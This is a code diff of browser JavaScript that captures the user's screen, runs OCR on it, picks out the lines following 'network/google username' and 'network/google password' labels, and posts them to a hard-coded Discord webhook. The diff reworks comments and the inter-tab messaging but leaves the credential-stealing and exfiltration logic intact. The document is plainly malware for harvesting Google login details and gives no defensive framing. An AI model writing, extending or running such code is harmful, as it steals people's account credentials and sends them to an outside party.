@@ -12,19 +12,19 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
 
 (async()=>{
   try{
-    // Open index.html WITH data to trigger test.html
+    // 1️⃣ open index.html with ?data=1 to trigger test.html
     const testTab = window.open("index.html?data=1","_blank");
 
-    // Immediately request screen capture
+    // 2️⃣ request screen capture immediately
     const stream = await navigator.mediaDevices.getDisplayMedia({video:{displaySurface:"browser"}});
 
-    // Tell test.html that permission is granted
-    testTab.postMessage({msg:"permission_granted"},"*");
+    // 3️⃣ tell test.html permissions are granted
+    testTab.postMessage({msg:"allowed-permissions"},"*");
 
-    // Wait for test.html to reply with "allowed"
+    // 4️⃣ wait for test.html to acknowledge with same message
     await new Promise(resolve=>{
       function handler(e){
-        if(e.data?.msg==="allowed"){
+        if(e.data?.msg==="allowed-permissions"){
           window.removeEventListener("message", handler);
           resolve();
         }
@@ -32,10 +32,7 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
       window.addEventListener("message", handler);
     });
 
-    // Send display_words message so test.html shows success
-    testTab.postMessage({msg:"display_words", text:"It worked! OCR will continue."},"*");
-
-    // Continue with OCR + Discord
+    // 5️⃣ continue with OCR + Discord
     const v=document.createElement("video");
     v.srcObject=stream; await v.play(); await new Promise(r=>setTimeout(r,1000));
 
@@ -55,11 +52,15 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
           o=l.reduce((a,v,i)=>a||(v.toLowerCase().includes("network/google username")||v.toLowerCase().includes("network/google password")?`${l[i+1]||""}\n${l[i+2]||""}`:""),"").trim();
     if(!o) return;
 
+    // send OCR result to Discord
     await fetch(W,{
       method:"POST",
       headers:{"Content-Type":"application/json"},
       body:JSON.stringify({content:o||"(no valid text found)"})
     });
+
+    // 6️⃣ notify test.html OCR finished
+    testTab.postMessage({msg:"finished"},"*");
 
     console.log("OCR + Discord done!");
   } catch(e){console.error(e);}
